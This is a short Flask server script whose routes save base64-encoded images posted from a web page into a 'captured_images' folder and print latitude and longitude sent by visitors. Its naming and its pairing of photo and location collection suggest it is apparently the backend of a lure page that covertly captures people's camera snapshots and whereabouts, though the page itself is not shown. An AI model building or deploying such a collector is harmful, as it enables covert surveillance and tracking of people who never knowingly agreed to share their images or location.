from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import base64, os

app = Flask(__name__, template_folder='templates')
CORS(app)

UPLOAD_FOLDER = 'captured_images'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.form['image'].split(',',1)[1]
    img = base64.b64decode(data)
    i = 1
    while os.path.exists(f'{UPLOAD_FOLDER}/photo_{i}.png'): i+=1
    with open(f'{UPLOAD_FOLDER}/photo_{i}.png','wb') as f: f.write(img)
    return 'OK', 200

@app.route('/receive-location', methods=['POST'])
def receive_location():
    d = request.json
    print(f"Lat={d.get('latitude')}, Lon={d.get('longitude')}")
    return jsonify(message="Location received"), 200

if __name__ == '__main__':
    app.run()
